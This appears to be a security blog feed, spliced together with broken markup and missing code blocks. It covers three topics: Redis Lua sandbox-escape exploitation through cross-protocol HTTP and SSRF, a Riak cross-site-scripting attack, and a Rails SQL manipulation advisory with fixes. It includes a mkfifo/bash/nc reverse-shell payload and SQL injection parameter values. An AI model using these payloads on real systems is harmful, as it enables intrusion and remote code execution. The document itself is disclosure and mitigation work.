-ERR unknown command 'Content-Length:'
-ERR unknown command 'Pragma:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Origin:'
-ERR unknown command 'User-Agent:'
-ERR unknown command 'Content-Type:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Referer:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Accept-Language:'
$-1
</code></pre>

<p>And in the stdout for Redis you will see:</p>

<pre><code>hello
</code></pre>

<p>The attacker is not able to read the response from the server because of the
same origin policy. However, this might be worked around by using a <a href="https://miki.it/blog/2015/4/20/the-power-of-dns-rebinding-stealing-wifi-passwords-with-a-website/">DNS rebinding attack</a>.
Even with DNS rebinding it might not be possible to read the response because
the response is not valid HTTP.</p>

<p>However, reading the response is not necessary because you can package a super generic
exploit that checks the result of the redis.call(&ldquo;INFO&rdquo;) command and then
launches a OS/architecture specific payload.</p>

<h2>SSRF attacks</h2>

<p>This is similar to attacking developers except a trusted server is tricked into
making a request to the Redis server However, you need a lot of control over
the body which might not often be possible depending on how the body is encoded.</p>

<h2>Redis Cloud Hosting</h2>

<p>This will only effect providers where people running arbitrary code from the
Redis process is not part of their threat model. The major players in this area
look like they are using sandboxing. For example the pids returned by &lsquo;INFO&rsquo; on
heroku are very low &lt;10 which indicates they are running the Redis servers in
containers. You can already run arbitrary code in containers via dynos on Heroku
so running arbitrary code in a Redis container is probably not useful for an
attacker. Amazon Elasticcache also looks like it uses linux containers.</p>

<p>Similarily, it looks like Microsoft&rsquo;s hosted Redis solution runs in an
isolated VM. Redis &lsquo;INFO&rsquo; returns a virtual os string and it takes ~15
minutes to launch an instance. If MS aren&rsquo;t running in an isolated VM then the
15 minute startup time is very weird.</p>

<p>This will be a problem if a hosting provider runs a whole bunch of redis
processes on the same machine/same VM from different customers without any
kind of isolation.</p>

<h1>Exploit</h1>

<p><a href="https://gist.github.com/corsix/6575486">Peter Cawley</a> has found that the
loadstring function can be used to load bytecode that is unsafe. He has
created three very useful lua exploit primitives that make exploitation easy.</p>

<p>First is a way of reading the Value contained in a TValue struct. This allows
reading the pointer value from a lua tagged value. Some pointer values are
already public (using tostring) but there doesn&rsquo;t seem to be a way to get the
pointer value for a lua string so this is useful.</p>

<p>Second is a way of reading 8 bytes from an arbitrary memory address.</p>

<p>Third is a way of writing 8 bytes to an arbitrary memory address.</p>

<p>Using the arbitrary memory read it is possible to leak the address of a known
C function. From the address of this c-function it is possible to find the base
address of the redis-server binary. From this base address it is possible to
find pointers to libc/libsystem_c functions and to find the base address of the
libc/libsystem_c libraries. From these libraries it is possible to find the
addresses of useful exported functions (longjump/system) and ROP gadgets. This
technique is similar to pwntools <a href="http://pwntools.readthedocs.org/en/latest/dynelf.html">dynelf</a></p>

<p>The arbitrary memory read is also used to leak an address inside the stack. The
lua_State object holds a long_jump variable that references a long_jump buffer
that is allocated on the stack. This leaks the stack address which can be useful
if you just want to corrupt the stack or the rsp and rip can be overwritten in
the longjump buf to directly take control when longjump is called. OSX has no
pointer mangling protections so this is quite easy to corrupt.</p>

<p>On linux the rip and rsp (and rbp) values are mangled. However, if you have full
read access to the memory you can reverse the secret cookie value to corrupt
the values. Also, linux prevents you from longjmp'ing to an invalid stack frame
(ie: the heap) but you can longjump to point the stack inside the longjump
buffer then pivot the stack into the heap. This is not really necessary if you
don&rsquo;t care about corrupting the stack and crashing the redis process but if you
longjump and don&rsquo;t corrupt the stack then you can resume normal execution of
redis after the exploit has finished running.</p>

<h1>Exploitability</h1>

<p>I have exploits for Linux 64 bit and OSX 64 bit. Both exploits take care to not
crash the redis server during successful execution. They will make a call to
system() then go back to normal redis execution.</p>

<p>I have run the Linux exploit on the Amazon RHEL Image (PIE enabled) and the
Amazon 14.04 Ubuntu Image (no PIE). I believe the exploit will work on most
modern Linux 64 bit systems (I suspect it will not work if you compile libc with
 fomit-frame-pointer but this can be worked around). It does not use any
hardcoded addresses from libc or the Redis binary.</p>

<p>The OSX version I have only tested on Yosemite but an earlier version was
working on Mavericks and I believe the Yosemite version works on both. This has
been tested with two different Redis versions and similarily does not depend on
hardcoded address from libsystem_c or the Redis binary. However, it uses
addresses from libsystem_c to speed up the exploit.</p>

<h1>Workarounds</h1>

<p>The best option is to set a strong password on Redis. Systems that are reachable
via HTTP without a password are a problem waiting to happen.</p>

<p>It is also possible to rename the EVAL command. If you are not using EVAL this
is a good option but you still might be at risk of someone modifying your Redis
data via HTTP SSRF attacks.</p>

<p>Upgrading to <a href="https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ">Redis 2.8.21 and 3.0.2</a>
will also fix this issue but I still strongly recommend using password
authentication on Redis systems.</p>

<p>This is heavily based on <a href="http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet">Aphyr’s work</a>. I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.</p>

<p>The attack will perform the following actions</p>

<ol>
<li>Write the value <code>lols=lols</code> to the <code>key i_can_run_better</code> in bucket <code>everything_you_can_run</code></li>
<li>Write the value <code>spawn(fun() -&gt; os:cmd("mkfifo /tmp/mypipe.$$ &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$") end)</code> to the file <code>/tmp/evil.erl</code></li>
<li>Evalute the contents of <code>/tmp/evil.erl</code> using the erlang function <code>file:path_eval</code>. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.</li>
</ol>

    <content type="html"><![CDATA[<p>Most Rails applications don&rsquo;t properly sanitise user input when passing it to queries (UPDATE: Rails has fixed the problems raised in this article so it was mostly a Rails problem rather than an application programmer problem). I&rsquo;m going to use an example to illustrate this problem.</p>

<h2>The Scenario</h2>

<p>Johnny has been tasked to add a password reset feature to his Rails application. So he adds a reset_token to his User model and a PasswordsController class to the application. When the user forgets their password they type in their email and a reset_token is generated and saved on the User model and a url containing the reset token is sent to the users email address. The url looks like <code>/users/1/passwords/edit?reset_token=kjksldjflskdjf</code>. This reset token is then checked when the user resets their password. Johnny writes the following code in the PasswordsController:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>

</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>

</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Johnny deploys this new feature to the staging environment and Mary is given the task to test it. Now Mary is quite clever and checks what happens if she removes the reset_token parameter from the url and changes the user id. She visits the url <code>/users/2/passwords/edit</code> and finds that she can change the password for any user that has not requested their password to be reset. She raises this as a critical bug.</p>

<p>Johnny reproduces the problem on his machine and notices it is is doing the following query:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
</span><span class='line'>  AND `users`.`reset_token` IS NULL LIMIT 1</span></code></pre></td></tr></table></div></figure>


<p>He realises he needs to stop users from not sending the reset_token parameter because if <code>params[:reset_token]</code> is <code>nil</code> then they can update any user who hasn&rsquo;t requested a password reset. He updates the code in PasswordController to the following:</p>

</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Mary tries her trick again but it doesn&rsquo;t work this time. But Mary has more tricks in her bag and this time she uses the url <code>/users/2/passwords/edit?reset_token[]</code> . Again she is able to change the password for any user that has not had a reset_token generated.</p>

<p>Johnny reproduces the problem on his machine and sees it doing the same query:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
</span><span class='line'>  AND `users`.`reset_token` IS NULL LIMIT 1</span></code></pre></td></tr></table></div></figure>


<p>Johnny is completely stumped as to how nil.blank? could be false. He adds some logging and finds the <code>params[:reset_token]</code> is actually an array containing a nil element: <code>[nil]</code>. He decides to fix the problem by calling <code>to_s</code> on the query parameters.</p>

<h2>Not Just Arrays (SQL Manipulation)</h2>

<p>If Johnny had a used the <code>where</code> function instead of <code>find_by_</code> then an attacker could have exploited it by passing in a <code>Hash</code> instead of an <code>Array</code>.</p>

<p>For example Mary could of sent the url <code>/users/2/passwords/edit?reset_token[users.id]=2</code>. The query then performed would have been:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
</span><span class='line'>  AND `users`.`id` = 2 LIMIT 1</span></code></pre></td></tr></table></div></figure>


<p>The user is able to change the token filter to a filter on a column of their choice. On previous versions of Rails this attack can be escalated
to arbitrary SQL injection. This attack uses the <a href="https://groups.google.com/group/rubyonrails-security/browse_thread/thread/6a1e473744bc389b">previously fixed issue</a> of SQL injection in table names and columns. This bug was originally not
as serious because you would not normally let a user choose arbitrary columns or table names in a query. However, with the SQL Manipulation bug an
attacker is now able to change table and column names to perform SQL injection.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>params[:role_id] = {"user_details.id` = 1 or 1 = 1); -- " =&gt; 1}
</span><span class='line'>UserDetail.find(:all, :conditions =&gt; {:role_id =&gt; params[:role_id]})
</span><span class='line'>
</span><span class='line'>UserDetail Load (0.5ms)   SELECT * FROM `users` WHERE
</span><span class='line'>(`user_details`.`id` = 1 or 1 = 1); -- ` = 1)</span></code></pre></td></tr></table></div></figure>


<p>This <code>Hash</code> problem is actually a security bug in rails and the rails team has released a patch for it.</p>

<h2>Underlying Problem</h2>

<p>The problem is developers expect the user input to be a <code>String</code> but it can also be an <code>Array</code> or a <code>Hash</code> and Rails has quite different behaviour if a <code>Hash</code> or an <code>Array</code> is passed in. The <code>Hash</code> is particularly troubling because if you have a filter on column X then a user can change it to be a filter on column Y. Example:</p>

<h2>Vulnerable Code</h2>

<ul>
<li><a href="https://github.com/thoughtbot/clearance">https://github.com/thoughtbot/clearance</a> - Possible to change any users password.</li>
<li>Rails ( 2.3.x, &lt; 3.2.6, &lt;3.1.6, &lt; 3.0.14) SQL manipulation/SQL injection anywhere there is use of <code>where()</code> or <code>find()</code> that takes user input.</li>
</ul>


<h2>Fixes</h2>

<ul>
<li>Rails has <a href="http://weblog.rubyonrails.org/2012/6/12/ann-rails-3-2-6-has-been-released/">released 3.2.6</a> that fixes both the nil issue and SQL manipulation/injection problems with <code>Hash</code>.</li>
<li>Clearance has released a new version <a href="http://robots.thoughtbot.com/post/24197949040/clearance-0-16-3-fixes-a-password-reset-vulnerability">0.6.13</a> which fixes the problem with nil parameters</li>
</ul>


<h2>Mitigation</h2>

<p>It is recommended that you install the Rails patches to fix the <code>Hash</code> problem and nil problem. Also, with security sensitive code I strongly recommend all query
parameters be coerced to the type you expect them to be. For example if you expect a parameter to be a <code>String</code> you should call <code>to_s</code> on it.</p>

<h2>Previous Work</h2>

<p>The Devise team seem to have been aware of the general problem of users being able to send non-string parameters. They have a <code>ParamFilter</code>
class that forces all parameters to be <code>String</code>s. It looks like they did this because they had an injection problem with mongoid.</p>

<h2>Stay Tuned</h2>

<p>We only covered the issues fixed in 3.2.5 and 3.2.4 in this article. There was another variant of the <code>Hash</code> attack that was fixed in 3.2.6. I will cover
that in a future article and show how to exploit it.</p>
